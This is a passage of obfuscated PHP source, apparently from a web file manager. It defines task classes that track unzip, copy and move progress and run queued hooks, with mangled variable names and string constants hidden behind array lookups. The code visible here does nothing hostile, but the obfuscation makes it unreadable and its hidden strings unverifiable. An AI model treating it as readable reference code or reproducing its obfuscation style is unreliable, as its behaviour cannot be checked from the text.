$öÂÏ¿É, $êÒşÒÄ­); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ì„Íüß, $‹ŸİÛô¬ = 5.0) { if (!$Ì„Íüß) { return; } $ÜÛŒüÇ = Cache::get($Ì„Íüß); if (!$ÜÛŒüÇ || timeFloat() - floatVal($ÜÛŒüÇ) >= $‹ŸİÛô¬) { Cache::set($Ì„Íüß, timeFloat(), $‹ŸİÛô¬ * 10); return !0; } return !1; } public static function timeLimitCall($Î÷¦ö›ì, $‹ÍØõ—°, $°¾¢ú, $ŸøüÅË‹ = 5.0) { $ı–ó–Çà =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Î÷¦ö›ì || !$‹ÍØõ—°) { return; } self::$asyncAdd = !0; $àùş±ãÆ = $ı–ó–Çà[2032]; $şÛ¿™¸à = Cache::get($àùş±ãÆ, !0); $•¯‡²‡õ = array($ı–ó–Çà[2033] => timeFloat(), $ı–ó–Çà[2034] => timeFloat(), $ı–ó–Çà[343] => $‹ÍØõ—°, $ı–ó–Çà[2024] => $°¾¢ú, $ı–ó–Çà[2035] => $ŸøüÅË‹); if (is_array($şÛ¿™¸à[$Î÷¦ö›ì])) { if (timeFloat() - $şÛ¿™¸à[$Î÷¦ö›ì][$ı–ó–Çà[2033]] <= $•¯‡²‡õ[$ı–ó–Çà[2035]] * 0.5) { return; } $•¯‡²‡õ[$ı–ó–Çà[2034]] = $şÛ¿™¸à[$Î÷¦ö›ì][$ı–ó–Çà[2034]]; } $şÛ¿™¸à[$Î÷¦ö›ì] = $•¯‡²‡õ; Cache::set($àùş±ãÆ, $şÛ¿™¸à, 60); Cache::removeMemory($àùş±ãÆ); write_log($ı–ó–Çà[2036] . $Î÷¦ö›ì . $ı–ó–Çà[74] . $‹ÍØõ—° . $ı–ó–Çà[2037] . ACTION, $ı–ó–Çà[196]); } public static function timeLimitCallLoop() { $ÀıŒ“ =& $_SERVER[¿ÈˆÑ¸ä]; $ØØ¸ÕÀÃ = array($ÀıŒ“[2038]); $¶úºö­ = in_array(strtolower(ACTION), $ØØ¸ÕÀÃ); if (!$¶úºö­ && !self::$asyncAdd) { return; } $¼Ç¹–òÔ = $ÀıŒ“[2032]; $€’µ¢×— = Cache::get($¼Ç¹–òÔ, !0); if (!$€’µ¢×— || count($€’µ¢×—) <= 0) { return; } $íÃ‹©ÄÙ = timeFloat(); $´°¢Ğ° = array(); $Åô“ÉÚ = array(); foreach ($€’µ¢×— as $šÁáòƒÃ => $¨ÆÚ„÷ñ) { if ($íÃ‹©ÄÙ - $¨ÆÚ„÷ñ[$ÀıŒ“[2034]] > $¨ÆÚ„÷ñ[$ÀıŒ“[2035]]) { $Åô“ÉÚ[$šÁáòƒÃ] = $¨ÆÚ„÷ñ; continue; } $´°¢Ğ°[$šÁáòƒÃ] = $¨ÆÚ„÷ñ; } if (count($Åô“ÉÚ) == 0) { return; } if (count($´°¢Ğ°) == 0) { Cache::remove($¼Ç¹–òÔ); } else { Cache::set($¼Ç¹–òÔ, $´°¢Ğ°, 60); } Cache::removeMemory($¼Ç¹–òÔ); self::runArr($Åô“ÉÚ); } public static function finished($’ÔÙ†§Ò, $Ğæù‡ùƒ) { $¹·Ñ¾ =& $_SERVER[¿ÈˆÑ¸ä]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¹·Ñ¾[343] => $’ÔÙ†§Ò, $¹·Ñ¾[2024] => $Ğæù‡ùƒ); } private static function runArr($¸ø¢îİ½) { $‚«ªé‹‘ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$¸ø¢îİ½) { return; } foreach ($¸ø¢îİ½ as $ÏïÒ‡€˜ => $Ê—Î§â) { try { Hook::apply($Ê—Î§â[$‚«ªé‹‘[343]], $Ê—Î§â[$‚«ªé‹‘[2024]]); write_log($‚«ªé‹‘[2039] . $ÏïÒ‡€˜ . $‚«ªé‹‘[74] . $Ê—Î§â[$‚«ªé‹‘[343]] . $‚«ªé‹‘[2037] . ACTION, $‚«ªé‹‘[196]); } catch (Exception $ĞÅªˆÑ) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $İˆÖ›şŸ =& $_SERVER[¿ÈˆÑ¸ä]; parent::startAfter(); Hook::bind($İˆÖ›şŸ[2040], array($this, $İˆÖ›şŸ[2041])); Hook::bind($İˆÖ›şŸ[1317], array($this, $İˆÖ›şŸ[2042])); Hook::bind($İˆÖ›şŸ[2043], array($this, $İˆÖ›şŸ[2044])); $ºÚµ——ô =& $this->task; $ºÚµ——ô[$İˆÖ›şŸ[2045]] = $İˆÖ›şŸ[1318]; if (!$ºÚµ——ô[$İˆÖ›şŸ[1802]]) { $ºÚµ——ô[$İˆÖ›şŸ[1802]] = LNG($İˆÖ›şŸ[2046]); } } protected function endAfter() { $Ü¡¾Òä± =& $_SERVER[¿ÈˆÑ¸ä]; parent::endAfter(); Hook::unbind($Ü¡¾Òä±[2040], array($this, $Ü¡¾Òä±[2041])); Hook::unbind($Ü¡¾Òä±[1317], array($this, $Ü¡¾Òä±[2042])); Hook::unbind($Ü¡¾Òä±[2043], array($this, $Ü¡¾Òä±[2044])); } public function updateAfter() { $÷À»ñª =& $_SERVER[¿ÈˆÑ¸ä]; $¯êòí„ =& $this->task; if (!$¯êòí„[$÷À»ñª[1165]] || !$¯êòí„[$÷À»ñª[847]]) { if ($¯êòí„[$÷À»ñª[2045]] != $÷À»ñª[389]) { return; } } if ($¯êòí„[$÷À»ñª[2045]] == $÷À»ñª[1318]) { $ÊÜ¡ÎÌÊ = 0; if ($¯êòí„[$÷À»ñª[1969]]) { $ÊÜ¡ÎÌÊ = $¯êòí„[$÷À»ñª[1970]] / $¯êòí„[$÷À»ñª[1969]]; } $¯êòí„[$÷À»ñª[1917]] = $ÊÜ¡ÎÌÊ * 0.3; } else { if ($¯êòí„[$÷À»ñª[2045]] == $÷À»ñª[389]) { $ÊÜ¡ÎÌÊ = $¯êòí„[$÷À»ñª[1916]] / $¯êòí„[$÷À»ñª[1165]]; $¯êòí„[$÷À»ñª[1917]] = 0.3 + $ÊÜ¡ÎÌÊ * 0.4; } else { if ($¯êòí„[$÷À»ñª[2045]] == $÷À»ñª[108]) { $ã£…Æ™× = 0; if ($¯êòí„[$÷À»ñª[1971]] == $÷À»ñª[108]) { $ã£…Æ™× = $¯êòí„[$÷À»ñª[1970]]; } $ÊÜ¡ÎÌÊ = ($¯êòí„[$÷À»ñª[1974]] + $ã£…Æ™×) / $¯êòí„[$÷À»ñª[847]]; $¯êòí„[$÷À»ñª[1917]] = 0.3 + 0.4 + $ÊÜ¡ÎÌÊ * 0.3; } } } if ($¯êòí„[$÷À»ñª[1917]] > 0) { $ß·™ù” = timeFloat() - $¯êòí„[$÷À»ñª[1919]] - $¯êòí„[$÷À»ñª[1922]]; $¯êòí„[$÷À»ñª[1923]] = $ß·™ù” * (1 - $¯êòí„[$÷À»ñª[1917]]) / $¯êòí„[$÷À»ñª[1917]]; } } public function addFile($ğâ®şÛ½) { $›÷ô•óá =& $_SERVER[¿ÈˆÑ¸ä]; $œª˜‚ÛÚ =& $this->task; $ó¤ßåœì = IO::info($ğâ®şÛ½); $œª˜‚ÛÚ[$›÷ô•óá[1967]] = $ó¤ßåœì[$›÷ô•óá[32]]; $œª˜‚ÛÚ[$›÷ô•óá[1969]] = $ó¤ßåœì[$›÷ô•óá[79]]; $œª˜‚ÛÚ[$›÷ô•óá[1970]] = 0; $œª˜‚ÛÚ[$›÷ô•óá[1167]] = $›÷ô•óá[1998]; $œª˜‚ÛÚ[$›÷ô•óá[1971]] = $›÷ô•óá[1318]; $œª˜‚ÛÚ[$›÷ô•óá[847]] = $ó¤ßåœì[$›÷ô•óá[79]]; $œª˜‚ÛÚ[$›÷ô•óá[1165]] = 1; $áì·Ãí = 0; $œª˜‚ÛÚ[$›÷ô•óá[1980]] = array($›÷ô•óá[1981] => $áì·Ãí + 1, $›÷ô•óá[505] => $ó¤ßåœì[$›÷ô•óá[32]], $›÷ô•óá[87] => $ó¤ßåœì[$›÷ô•óá[87]], $›÷ô•óá[598] => $ó¤ßåœì[$›÷ô•óá[598]] ? $ó¤ßåœì[$›÷ô•óá[598]] : $ó¤ßåœì[$›÷ô•óá[87]]); $this->update(); } public function zipEvent($É‰˜û‘Í, $Ã˜ö³µ, $Ó¥œåİõ, $Ã¥Ø®–ë) { $¥€½ìââ =& $_SERVER[¿ÈˆÑ¸ä]; $î‹§„  =& $this->task; $î‹§„ [$¥€½ìââ[1967]] = get_path_this($Ã˜ö³µ); $î‹§„ [$¥€½ìââ[1969]] = $Ã¥Ø®–ë; $î‹§„ [$¥€½ìââ[1970]] = $Ó¥œåİõ; $î‹§„ [$¥€½ìââ[1167]] = $É‰˜û‘Í == $¥€½ìââ[2047] ? $¥€½ìââ[2048] : $¥€½ìââ[2049]; $î‹§„ [$¥€½ìââ[1971]] = $¥€½ìââ[12]; $î‹§„ [$¥€½ìââ[847]] = $Ã¥Ø®–ë; $î‹§„ [$¥€½ìââ[2045]] = $¥€½ìââ[389]; $this->update(); } public function unzipAfter($ƒÎÛƒ) { $Ü’¾·¶ƒ =& $_SERVER[¿ÈˆÑ¸ä]; $Êí×îù„ =& $this->task; $Êí×îù„[$Ü’¾·¶ƒ[2045]] = $Ü’¾·¶ƒ[108]; $÷á­…™ß = IO::infoWithChildren($ƒÎÛƒ); $ÀÇÀò— = 0; $Êí×îù„[$Ü’¾·¶ƒ[1980]] = array($Ü’¾·¶ƒ[1981] => $ÀÇÀò— + 1, $Ü’¾·¶ƒ[505] => $÷á­…™ß[$Ü’¾·¶ƒ[32]], $Ü’¾·¶ƒ[87] => $÷á­…™ß[$Ü’¾·¶ƒ[87]], $Ü’¾·¶ƒ[598] => $÷á­…™ß[$Ü’¾·¶ƒ[598]] ? $÷á­…™ß[$Ü’¾·¶ƒ[598]] : $÷á­…™ß[$Ü’¾·¶ƒ[87]]); if ($÷á­…™ß[$Ü’¾·¶ƒ[33]] == $Ü’¾·¶ƒ[231]) { $Êí×îù„[$Ü’¾·¶ƒ[1165]] = 1; } else { $Êí×îù„[$Ü’¾·¶ƒ[1165]] = $÷á­…™ß[$Ü’¾·¶ƒ[82]][$Ü’¾·¶ƒ[80]]; } $Êí×îù„[$Ü’¾·¶ƒ[1167]] = $Ü’¾·¶ƒ[12]; $Êí×îù„[$Ü’¾·¶ƒ[1971]] = 0; $Êí×îù„[$Ü’¾·¶ƒ[1916]] = 0; $Êí×îù„[$Ü’¾·¶ƒ[1969]] = 0; $Êí×îù„[$Ü’¾·¶ƒ[1970]] = 0; $Êí×îù„[$Ü’¾·¶ƒ[1967]] = $Ü’¾·¶ƒ[12]; $Êí×îù„[$Ü’¾·¶ƒ[1974]] = 0; $Êí×îù„[$Ü’¾·¶ƒ[847]] = $÷á­…™ß[$Ü’¾·¶ƒ[79]]; $this->update(); self::log($Ü’¾·¶ƒ[2050] . json_encode(array($Êí×îù„, $÷á­…™ß))); } public function nameParse($×ùûµ‹ª) { $öï´Ä†ã =& $_SERVER[¿ÈˆÑ¸ä]; $ß‡¿‘ºƒ =& $this->task; if ($ß‡¿‘ºƒ[$öï´Ä†ã[2045]] == $öï´Ä†ã[1318]) { $ß‡¿‘ºƒ[$öï´Ä†ã[2045]] = $öï´Ä†ã[389]; $ß‡¿‘ºƒ[$öï´Ä†ã[1974]] = 0; $ß‡¿‘ºƒ[$öï´Ä†ã[847]] = 0; } $˜™ĞˆåÅ = get_path_this($×ùûµ‹ª); if (strstr($˜™ĞˆåÅ, $öï´Ä†ã[10])) { $ß‡¿‘ºƒ[$öï´Ä†ã[1916]] += 1; $ß‡¿‘ºƒ[$öï´Ä†ã[1165]] += 1; } $ß‡¿‘ºƒ[$öï´Ä†ã[1967]] = $×ùûµ‹ª; $this->update(); } } goto bÈ—ÜÒ©•; fäÅŞ©ƒºÓ: class TaskFileTransfer extends Task { protected function startAfter() { $ä£ÚÊÆô =& $_SERVER[¿ÈˆÑ¸ä]; $ûÃÍ™¢ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ä£ÚÊÆô[1946], array($this, $ä£ÚÊÆô[1947])); Hook::bind($ä£ÚÊÆô[1347], array($this, $ä£ÚÊÆô[1948])); Hook::bind($ä£ÚÊÆô[1949], array($this, $ä£ÚÊÆô[1950])); Hook::bind($ä£ÚÊÆô[687], array($this, $ä£ÚÊÆô[1951])); Hook::bind($ä£ÚÊÆô[688], array($this, $ä£ÚÊÆô[1952])); Hook::bind($ä£ÚÊÆô[694], array($this, $ä£ÚÊÆô[1953])); Hook::bind($ä£ÚÊÆô[695], array($this, $ä£ÚÊÆô[1954])); Hook::bind($ä£ÚÊÆô[690], array($this, $ä£ÚÊÆô[1955])); Hook::bind($ä£ÚÊÆô[692], array($this, $ä£ÚÊÆô[1956])); Hook::bind($ä£ÚÊÆô[656], array($this, $ä£ÚÊÆô[1957])); Hook::bind($ä£ÚÊÆô[653], array($this, $ä£ÚÊÆô[1957])); Hook::bind($ä£ÚÊÆô[658], array($this, $ä£ÚÊÆô[1957])); Hook::bind($ä£ÚÊÆô[660], array($this, $ä£ÚÊÆô[1957])); Hook::bind($ä£ÚÊÆô[662], array($this, $ä£ÚÊÆô[1957])); Hook::bind($ä£ÚÊÆô[1958], array($this, $ä£ÚÊÆô[1959])); Hook::bind($ä£ÚÊÆô[678], array($this, $ä£ÚÊÆô[1960])); $this->sourceModelCopyFlag = !1; Hook::bind($ä£ÚÊÆô[1961], array($this, $ä£ÚÊÆô[1962])); Hook::bind($ä£ÚÊÆô[1963], array($this, $ä£ÚÊÆô[1964])); Hook::bind($ä£ÚÊÆô[1965], array($this, $ä£ÚÊÆô[1966])); $ûÃÍ™¢[$ä£ÚÊÆô[1967]] = LNG($ä£ÚÊÆô[1968]); $ûÃÍ™¢[$ä£ÚÊÆô[1969]] = 0; $ûÃÍ™¢[$ä£ÚÊÆô[1970]] = 0; $ûÃÍ™¢[$ä£ÚÊÆô[1167]] = $ä£ÚÊÆô[12]; $ûÃÍ™¢[$ä£ÚÊÆô[1971]] = $ä£ÚÊÆô[12]; $ûÃÍ™¢[$ä£ÚÊÆô[1972]] = 0; $ûÃÍ™¢[$ä£ÚÊÆô[1973]] = 0; $ûÃÍ™¢[$ä£ÚÊÆô[1974]] = 0; if (!$ûÃÍ™¢[$ä£ÚÊÆô[1802]]) { $ûÃÍ™¢[$ä£ÚÊÆô[1802]] = LNG($ä£ÚÊÆô[1975]); } } protected function endAfter() { $ÇÅìš¶Ò =& $_SERVER[¿ÈˆÑ¸ä]; Hook::unbind($ÇÅìš¶Ò[1946], array($this, $ÇÅìš¶Ò[1947])); Hook::unbind($ÇÅìš¶Ò[1347], array($this, $ÇÅìš¶Ò[1948])); Hook::unbind($ÇÅìš¶Ò[1949], array($this, $ÇÅìš¶Ò[1950])); Hook::unbind($ÇÅìš¶Ò[687], array($this, $ÇÅìš¶Ò[1951])); Hook::unbind($ÇÅìš¶Ò[688], array($this, $ÇÅìš¶Ò[1952])); Hook::unbind($ÇÅìš¶Ò[694], array($this, $ÇÅìš¶Ò[1953])); Hook::unbind($ÇÅìš¶Ò[695], array($this, $ÇÅìš¶Ò[1954])); Hook::unbind($ÇÅìš¶Ò[690], array($this, $ÇÅìš¶Ò[1955])); Hook::unbind($ÇÅìš¶Ò[692], array($this, $ÇÅìš¶Ò[1956])); Hook::unbind($ÇÅìš¶Ò[656], array($this, $ÇÅìš¶Ò[1957])); Hook::unbind($ÇÅìš¶Ò[653], array($this, $ÇÅìš¶Ò[1957])); Hook::unbind($ÇÅìš¶Ò[658], array($this, $ÇÅìš¶Ò[1957])); Hook::unbind($ÇÅìš¶Ò[660], array($this, $ÇÅìš¶Ò[1957])); Hook::unbind($ÇÅìš¶Ò[662], array($this, $ÇÅìš¶Ò[1957])); Hook::unbind($ÇÅìš¶Ò[1958], array($this, $ÇÅìš¶Ò[1959])); Hook::unbind($ÇÅìš¶Ò[678], array($this, $ÇÅìš¶Ò[1960])); Hook::unbind($ÇÅìš¶Ò[1961], array($this, $ÇÅìš¶Ò[1962])); Hook::unbind($ÇÅìš¶Ò[1963], array($this, $ÇÅìš¶Ò[1964])); Hook::unbind($ÇÅìš¶Ò[1965], array($this, $ÇÅìš¶Ò[1966])); } public function copyMoveStart($¤»‡÷ÕÜ, $è¢á…¿, $Ìš±Ë¡©, $üéÙô×ï) { $¡„‡‡£½ =& $_SERVER[¿ÈˆÑ¸ä]; self::log($¡„‡‡£½[1976] . $è¢á…¿ . $¡„‡‡£½[73] . $üéÙô×ï); $œ¡µ’¢· = rtrim(TEMP_FILES, $¡„‡‡£½[8]); if (substr($è¢á…¿, 0, strlen($œ¡µ’¢·)) == $œ¡µ’¢·) { return; } if (substr($üéÙô×ï, 0, strlen($œ¡µ’¢·)) == $œ¡µ’¢·) { return; } $óãËÈó¹ =& $this->task; $óãËÈó¹[$¡„‡‡£½[1977]] = KodIO::transferType($¤»‡÷ÕÜ, $Ìš±Ë¡©); self::log($¡„‡‡£½[1978] . $óãËÈó¹[$¡„‡‡£½[1977]] . $¡„‡‡£½[74] . $è¢á…¿ . $¡„‡‡£½[73] . $üéÙô×ï); $this->update(); } public function updateAfter() { $§ïÅõ®‘ =& $_SERVER[¿ÈˆÑ¸ä]; $˜í³½·ú =& $this->task; if (!$˜í³½·ú[$§ïÅõ®‘[847]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($˜í³½·ú[$§ïÅõ®‘[1977]] == $§ïÅõ®‘[1450]) { return; } self::updateTask($˜í³½·ú); } private static function updateTask(&$Å×•¶‹) { $àó¤İ =& $_SERVER[¿ÈˆÑ¸ä]; if ($Å×•¶‹[$àó¤İ[1977]] == $àó¤İ[1318] || $Å×•¶‹[$àó¤İ[1977]] == $àó¤İ[108]) { if ($Å×•¶‹[$àó¤İ[1971]]) { $Å×•¶‹[$àó¤İ[1974]] = $Å×•¶‹[$àó¤İ[1973]] + $Å×•¶‹[$àó¤İ[1970]]; } } else { if ($Å×•¶‹[$àó¤İ[1977]] == $àó¤İ[1451]) { if ($Å×•¶‹[$àó¤İ[1971]] == $àó¤İ[1318]) { $Å×•¶‹[$àó¤İ[1974]] = $Å×•¶‹[$àó¤İ[1973]] + $Å×•¶‹[$àó¤İ[1970]] * 0.5; } else { if ($Å×•¶‹[$àó¤İ[1971]] == $àó¤İ[108]) { $Å×•¶‹[$àó¤İ[1974]] = $Å×•¶‹[$àó¤İ[1973]] + $Å×•¶‹[$àó¤İ[1969]] * 0.5 + $Å×•¶‹[$àó¤İ[1970]] * 0.5; } } } } $Å×•¶‹[$àó¤İ[1917]] = $Å×•¶‹[$àó¤İ[1974]] / $Å×•¶‹[$àó¤İ[847]]; if ($Å×•¶‹[$àó¤İ[1917]] > 0) { $‚êÙÑ„¢ = timeFloat() - $Å×•¶‹[$àó¤İ[1919]] - $Å×•¶‹[$àó¤İ[1922]]; $Å×•¶‹[$àó¤İ[1923]] = $‚êÙÑ„¢ * (1 - $Å×•¶‹[$àó¤İ[1917]]) / $Å×•¶‹[$àó¤İ[1917]]; } $äµË‹÷ = $Å×•¶‹[$àó¤İ[1970]] . $àó¤İ[930] . $Å×•¶‹[$àó¤İ[1969]] . "\73\40{$‰²Á¯Ş½}\73" . $Å×•¶‹[$àó¤İ[1974]]; self::log($àó¤İ[1979] . $Å×•¶‹[$àó¤İ[1971]] . $àó¤İ[74] . $Å×•¶‹[$àó¤İ[1917]] . $àó¤İ[74] . $äµË‹÷); } public function addPath($½ĞÌÑø) { $ÚÂóäÈ‡ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$½ĞÌÑø) { return; } $Ó¤šïÙ =& $this->task; $À­Ô¨œ = IO::infoWithChildren($½ĞÌÑø); $Š«“¨ÔØ = $Ó¤šïÙ[$ÚÂóäÈ‡[1980]] ? $Ó¤šïÙ[$ÚÂóäÈ‡[1980]][$ÚÂóäÈ‡[1981]] : 0; $Ó¤šïÙ[$ÚÂóäÈ‡[1980]] = array($ÚÂóäÈ‡[1981] => $Š«“¨ÔØ + 1, $ÚÂóäÈ‡[505] => $À­Ô¨œ[$ÚÂóäÈ‡[32]], $ÚÂóäÈ‡[87] => $À­Ô¨œ[$ÚÂóäÈ‡[87]], $ÚÂóäÈ‡[598] => $À­Ô¨œ[$ÚÂóäÈ‡[598]] ? $À­Ô¨œ[$ÚÂóäÈ‡[598]] : $À­Ô¨œ[$ÚÂóäÈ‡[87]]); if ($À­Ô¨œ[$ÚÂóäÈ‡[33]] == $ÚÂóäÈ‡[231]) { $Ó¤šïÙ[$ÚÂóäÈ‡[1165]] += 1; } else { $Ó¤šïÙ[$ÚÂóäÈ‡[1165]] += $À­Ô¨œ[$ÚÂóäÈ‡[82]][$ÚÂóäÈ‡[80]]; if ($À­Ô¨œ[$ÚÂóäÈ‡[192]]) { $Ó¤šïÙ[$ÚÂóäÈ‡[1165]] += $À­Ô¨œ[$ÚÂóäÈ‡[82]][$ÚÂóäÈ‡[81]] + 1; } } $Ó¤šïÙ[$ÚÂóäÈ‡[847]] += $À­Ô¨œ[$ÚÂóäÈ‡[79]]; $this->update(); self::log(array($ÚÂóäÈ‡[1982] . $½ĞÌÑø, $À­Ô¨œ)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ïšÃŠµğ) { } public function sourceAddHashEnd($ÚïˆÄÙ) { } public function sourceAddFileStart($¤”Öœ‰¡) { $¶ªü¿˜” =& $_SERVER[¿ÈˆÑ¸ä]; $£Ïø–ï =& $this->task; $£Ïø–ï[$¶ªü¿˜”[1969]] = $¤”Öœ‰¡[$¶ªü¿˜”[79]]; $£Ïø–ï[$¶ªü¿˜”[1967]] = $¤”Öœ‰¡[$¶ªü¿˜”[32]]; $£Ïø–ï[$¶ªü¿˜”[1167]] = $¤”Öœ‰¡[$¶ªü¿˜”[32]]; $£Ïø–ï[$¶ªü¿˜”[1983]] = $¤”Öœ‰¡[$¶ªü¿˜”[87]]; $this->update(); self::log($¶ªü¿˜”[1984] . $¤”Öœ‰¡[$¶ªü¿˜”[87]] . $¶ªü¿˜”[1985] . $¤”Öœ‰¡[$¶ªü¿˜”[79]]); } public function sourceAddFileEnd($ÊÇİÛ€Ù) { $„ı¨ÄæÓ =& $_SERVER[¿ÈˆÑ¸ä]; $ƒõı³õ =& $this->task; $ƒõı³õ[$„ı¨ÄæÓ[1974]] += $ÊÇİÛ€Ù[$„ı¨ÄæÓ[79]]; $ƒõı³õ[$„ı¨ÄæÓ[1983]] = $ÊÇİÛ€Ù[$„ı¨ÄæÓ[87]]; $this->update(1); self::log($„ı¨ÄæÓ[1986] . $ÊÇİÛ€Ù[$„ı¨ÄæÓ[87]] . $„ı¨ÄæÓ[1985] . $ÊÇİÛ€Ù[$„ı¨ÄæÓ[79]] . $„ı¨ÄæÓ[1987]); } public function copyFileStart($ÜĞıùÃİ, $•ªºÇ†ù, $Æ…‡£ßç, $Ëğø’±¤, $Ë†Ö‰¾í, $ÜŒßÂƒÊ) { $“áÉ™Ş =& $_SERVER[¿ÈˆÑ¸ä]; $‡¼ƒùÍ = $Ë†Ö‰¾í; if ($‡¼ƒùÍ == $GLOBALS[$“áÉ™Ş[1988]]) { $‡¼ƒùÍ = $GLOBALS[$“áÉ™Ş[1989]]; } $GLOBALS[$“áÉ™Ş[1989]] = $Ë†Ö‰¾í; $GLOBALS[$“áÉ™Ş[1988]] = $ÜŒßÂƒÊ; $à”ÃÂÊã =& $this->task; $à”ÃÂÊã[$“áÉ™Ş[1967]] = $‡¼ƒùÍ; $à”ÃÂÊã[$“áÉ™Ş[1969]] = (int) $ÜĞıùÃİ->size($•ªºÇ†ù); $à”ÃÂÊã[$“áÉ™Ş[1970]] = 0; $à”ÃÂÊã[$“áÉ™Ş[1167]] = $“áÉ™Ş[12]; $à”ÃÂÊã[$“áÉ™Ş[1971]] = $“áÉ™Ş[12]; $à”ÃÂÊã[$“áÉ™Ş[1972]] = 0; $ş­’Šñì = $à”ÃÂÊã[$“áÉ™Ş[1969]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($à”ÃÂÊã[$“áÉ™Ş[483]] . $“áÉ™Ş[1990]); if ($ş­’Šñì && file_exists(get_path_father($Ëğø’±¤))) { Cache::set($à”ÃÂÊã[$“áÉ™Ş[483]] . $“áÉ™Ş[1990], $Ëğø’±¤); $à”ÃÂÊã[$“áÉ™Ş[1940]] = array($“áÉ™Ş[1991], $“áÉ™Ş[1992]); } $this->update(0, $ş­’Šñì); self::log("\143\x6f\x70\171\106\x69\x6c\x65\x53\164\141\x72\164\72{$•ªºÇ†ù}\73"); } public static function updateCopyLocalFileSize($•‡²‡Å) { $šĞÃ¢Ûæ =& $_SERVER[¿ÈˆÑ¸ä]; $ÎÑøË‘ï = Cache::get($•‡²‡Å[$šĞÃ¢Ûæ[483]] . $šĞÃ¢Ûæ[1990]); if (!$ÎÑøË‘ï || !file_exists($ÎÑøË‘ï)) { return $•‡²‡Å; } $•‡²‡Å[$šĞÃ¢Ûæ[1970]] = @filesize($ÎÑøË‘ï); $•‡²‡Å[$šĞÃ¢Ûæ[1974]] += $•‡²‡Å[$šĞÃ¢Ûæ[1970]]; self::updateTask($•‡²‡Å); return $•‡²‡Å; } public function copyFileEnd($Û¡Õ«‰ß, $³ğË©²ù, $ò¤®°”Ó, $ƒ‘Ÿê‰º, $ùØ†ãĞ“, $ÖÏ€êÅå) { $Ã±›¦§£ =& $_SERVER[¿ÈˆÑ¸ä]; $Ç¯Ü Ö =& $this->task; $Ç¯Ü Ö[$Ã±›¦§£[1970]] = $Ç¯Ü Ö[$Ã±›¦§£[1969]]; $Ç¯Ü Ö[$Ã±›¦§£[1971]] = $Ã±›¦§£[12]; unset($Ç¯Ü Ö[$Ã±›¦§£[1940]]); if ($ùØ†ãĞ“ == $Ç¯Ü Ö[$Ã±›¦§£[1967]]) { $Ç¯Ü Ö[$Ã±›¦§£[1973]] += $Ç¯Ü Ö[$Ã±›¦§£[1969]]; $Ç¯Ü Ö[$Ã±›¦§£[1974]] = $Ç¯Ü Ö[$Ã±›¦§£[1973]]; $Åâ¡Å— = 1; if (isset($Ç¯Ü Ö[$Ã±›¦§£[1983]]) && $Ç¯Ü Ö[$Ã±›¦§£[1983]] == $³ğË©²ù) { $Åâ¡Å— = 0; } $this->update($Åâ¡Å—); } else { $this->update(); $Ç¯Ü Ö[$Ã±›¦§£[1970]] = 0; } Cache::remove($Ç¯Ü Ö[$Ã±›¦§£[483]] . $Ã±›¦§£[1990]); self::log($Ã±›¦§£[1993] . $³ğË©²ù . $Ã±›¦§£[73] . $ƒ‘Ÿê‰º . $Ã±›¦§£[286] . $ùØ†ãĞ“ . $Ã±›¦§£[1994] . $Ç¯Ü Ö[$Ã±›¦§£[1967]]); } public function updateFileEnd($ªìè§¡à, $¡‡à»Í‚) { $ó¹°ä‘ =& $_SERVER[¿ÈˆÑ¸ä]; $ĞğÚÒ =& $this->task; $ĞğÚÒ[$ó¹°ä‘[1967]] = $ªìè§¡à; $ĞğÚÒ[$ó¹°ä‘[1969]] = $¡‡à»Í‚; $ĞğÚÒ[$ó¹°ä‘[1973]] += $¡‡à»Í‚; $ĞğÚÒ[$ó¹°ä‘[1974]] = $ĞğÚÒ[$ó¹°ä‘[1973]]; $this->update(1); self::log($ó¹°ä‘[1995] . $ªìè§¡à); } public function sourceModelCopy($”é×–ó) { $ûŞÅÀÔ =& $_SERVER[¿ÈˆÑ¸ä]; $º‹©‚Î = $”é×–ó[0]; $¬Çº‰Ö÷ = $”é×–ó[1]; $‹Ë§„ë² =& $this->task; $this->sourceModelCopyFlag = !0; $ ÖÒÉÂõ = 0; switch ($º‹©‚Î) { case $ûŞÅÀÔ[654]: $ ÖÒÉÂõ = 1; break; case $ûŞÅÀÔ[657]: $‹Ë§„ë²[$ûŞÅÀÔ[1967]] = $¬Çº‰Ö÷[$ûŞÅÀÔ[32]]; break; case $ûŞÅÀÔ[659]: $ ÖÒÉÂõ = intval($”é×–ó[$ûŞÅÀÔ[467]] * 0.4); break; case $ûŞÅÀÔ[661]: $ ÖÒÉÂõ = intval($”é×–ó[$ûŞÅÀÔ[467]] * 0.2); break; case $ûŞÅÀÔ[663]: $ ÖÒÉÂõ = intval($”é×–ó[$ûŞÅÀÔ[467]] * 0.4); break; } $this->update($ ÖÒÉÂõ); self::log(array("{$º‹©‚Î}\73\x61\144\x64\x3d{$ ÖÒÉÂõ}", $”é×–ó)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($½ÍÑ”…½, $š”»¸Í) { $ÖŒÜÀÜí =& $_SERVER[¿ÈˆÑ¸ä]; $this->sourceModelCopyFlag = !0; $âĞ¯È±• = 1; if (isset($½ÍÑ”…½[$ÖŒÜÀÜí[82]])) { $âĞ¯È±• = $½ÍÑ”…½[$ÖŒÜÀÜí[82]][$ÖŒÜÀÜí[80]]; $âĞ¯È±• = $âĞ¯È±• + $½ÍÑ”…½[$ÖŒÜÀÜí[82]][$ÖŒÜÀÜí[81]] + 1; } $this->update($âĞ¯È±•); $this->sourceModelCopyFlag = !1; $this->log(array($ÖŒÜÀÜí[1996], $âĞ¯È±•, $½ÍÑ”…½)); } public function sourceMove($û²‘˜êó) { $this->sourceRemove($û²‘˜êó, !1); } public function curlProgress($¦—º‡, $ÑÙÍªÀ¬, $Ó—ÄŞàÊ, $øÀøèáĞ, 